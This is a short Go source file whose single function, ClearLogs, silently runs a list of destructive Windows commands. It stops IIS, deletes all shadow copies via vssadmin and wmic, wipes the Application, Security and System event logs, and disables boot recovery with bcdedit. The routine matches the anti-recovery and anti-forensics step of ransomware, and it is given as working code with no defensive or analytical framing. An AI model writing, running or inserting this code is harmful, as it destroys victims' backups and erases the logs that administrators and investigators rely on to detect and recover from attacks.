package logs

import "os/exec"

func ClearLogs() {
	cmds := []string{
		"iisreset /stop",
		"vssadmin delete shadows /all /quiet",
		"wmic shadowcopy delete",
		"wevtutil clear-log Application",
		"wevtutil clear-log Security",
		"wevtutil clear-log System",
		"bcdedit /set (default) bootstatuspolicy ignoreallfailures",
		"bcdedit /set (default) recoveryenabled no",
	}
	// looping commands execution
	for _, cmd := range cmds {
		exec.Command("cmd", "/c", cmd).Run()
	}
}
